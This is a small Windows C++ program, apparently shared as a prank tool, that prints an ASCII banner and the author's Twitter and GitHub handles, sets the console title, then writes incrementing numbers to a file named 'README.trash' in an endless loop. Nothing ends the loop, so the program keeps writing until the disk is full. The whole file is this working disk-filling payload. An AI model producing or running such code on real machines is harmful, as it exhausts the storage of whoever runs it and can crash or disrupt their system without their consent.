#include <iostream>
#include <Windows.h>
#include <fstream>

using namespace std;

int main()
{

	/*
	follow @Innocentkys on Twitter 
	& 
	@Innocent1337 on GitHub :-)
	*/

	cout << " _                           .____             " << endl;
	cout << " | , __   , __     __.       /     ,   . , __  " << endl;
	cout << " | |'  `. |'  `. .'   \      |__.  |   | |'  `." << endl;
	cout << " | |    | |    | |    |      |     |   | |    |" << endl;
	cout << " / /    | /    |  `._.'      /     `._/| /    |" << endl;
	cout << "                                               " << endl;
	cout << " " << endl;
	cout << "Follow https://twitter.com/Innocentkys" << endl;

	SetConsoleTitleA("Innocents.eu");

	int value = 1;
	ofstream trash;
	trash.open("README.trash");
	while (true)
	{
		trash << value;
		value++;
	}
	trash.close();
}
